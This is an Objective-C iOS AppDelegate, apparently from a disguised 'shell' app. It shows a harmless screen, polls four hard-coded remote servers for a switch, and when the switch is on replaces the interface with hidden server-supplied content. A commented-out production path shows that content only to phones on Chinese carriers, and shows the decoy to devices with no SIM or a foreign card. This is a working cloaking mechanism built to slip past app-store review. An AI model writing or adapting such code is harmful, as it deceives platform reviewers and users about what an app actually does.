//
//  AppDelegate.m
//  demo
//
//  Created by Carr on 9/5/2019.
//  Copyright © 2019 Tool. All rights reserved.
//

#import "AppDelegate.h"
#import "HideViewController.h"
#import "RequestManager.h"
#import <AFNetworking.h>
#import "CBToast.h"
#import "NormalViewController.h"
#import <YYModel.h>
#import "HideModel.h"
#import "HideData.h"
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>

#define myapi1 @"https://yyhdf.rjvrm.cn/app/info"
#define myapi2 @"https://dfagg.wmfqh.cn/app/info"
#define myapi3 @"https://oousd.goto898.com/app/info"
#define myapi4 @"https://trytsf.while898.com/app/info"

#define APPID @"29fa784a6d39a2795df2b9b913b4320e"

@interface AppDelegate ()

@property(nonatomic, assign) BOOL blockRotation;
@property(nonatomic, assign) int tryNum;

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];
    [self.window makeKeyAndVisible];
    self.window.backgroundColor=[UIColor whiteColor];
    NormalViewController *normalVC = [NormalViewController new];
    self.window.rootViewController = normalVC;
    
    self.blockRotation = NO;
    self.tryNum = 1;
    [self judgeNetworking];
#pragma 生产环境时切换下面这个方法(先判断运营商再做其他判断)
//    [self obtainOperator];//判断运营商
    
    return YES;
}

-(void)obtainOperator{
    //获取本机运营商名称
    CTTelephonyNetworkInfo *info = [[CTTelephonyNetworkInfo alloc] init];
    CTCarrier *carrier = [info subscriberCellularProvider];
    //当前手机所属运营商名称
    NSString *mobile;
    //先判断有没有SIM卡，如果没有则不获取本机运营商
    if (!carrier.isoCountryCode) {
        NSLog(@"没有SIM卡,显示壳子内容");
        mobile = @"无运营商";
    }else{
        mobile = [carrier carrierName];
        if ([mobile containsString:@"联通"]||[mobile containsString:@"移动"]||[mobile containsString:@"电信"]||[mobile containsString:@"铁通"]) {
            [self judgeNetworking];
        }else{
            NSLog(@"国外的卡,显示壳子内容");
        }
    }
    NSLog(@"%@", mobile);
}

-(void)judgeNetworking{
    //1.创建网络监听管理者
    AFNetworkReachabilityManager *manager = [AFNetworkReachabilityManager sharedManager];
    [manager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
        switch (status) {
            case AFNetworkReachabilityStatusUnknown:
                NSLog(@"未知");
                [CBToast showToast:@"网络状态不太好" location:@"center" showTime:5.0];
                break;
            case AFNetworkReachabilityStatusNotReachable:
                NSLog(@"没有网络");
                [CBToast showToast:@"没有网络" location:@"center" showTime:5.0];
                break;
            case AFNetworkReachabilityStatusReachableViaWWAN:
                NSLog(@"3G/4G");
            [self loadData:myapi1];
                break;
            case AFNetworkReachabilityStatusReachableViaWiFi:
                NSLog(@"WIFI");
            [self loadData:myapi1];
                break;
            default:
                break;
        }
    }];
    //3.开始监听
    [manager startMonitoring];
}

-(void)loadData:(NSString *)urlStr {
    NSDictionary *parameters = @{@"a":APPID, @"b":@"2"};
    [[RequestManager sharedManager] postRequest:urlStr parameters:parameters success:^(id  _Nonnull responseObject) {
        NSLog(@"responseObject:%@", responseObject);
        HideModel *model = [HideModel yy_modelWithJSON:responseObject];
        if ([model.msg isEqualToString:@"SUCCESS"]) {
            HideData *data = model.data;
            if ([data.switchOn isEqualToString:@"1"]) {
                self.blockRotation = YES;
                HideViewController *hideVC = [HideViewController new];
                hideVC.model = data;
                self.window.rootViewController = hideVC;
            }
        }
    } failure:^(NSError * _Nonnull error) {
        NSLog(@"%@", error);
        self.tryNum++;
        switch (self.tryNum) {
            case 2:
            [self loadData:myapi2];
            break;
            case 3:
            [self loadData:myapi3];
            break;
            case 4:
            [self loadData:myapi4];
            break;
            default:
            break;
        }
    }];
}

-(UIInterfaceOrientationMask)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window{
    if (self.blockRotation) {
        return UIInterfaceOrientationMaskAll;
    }else{
        return UIInterfaceOrientationMaskPortrait;
    }
}

- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}

@end
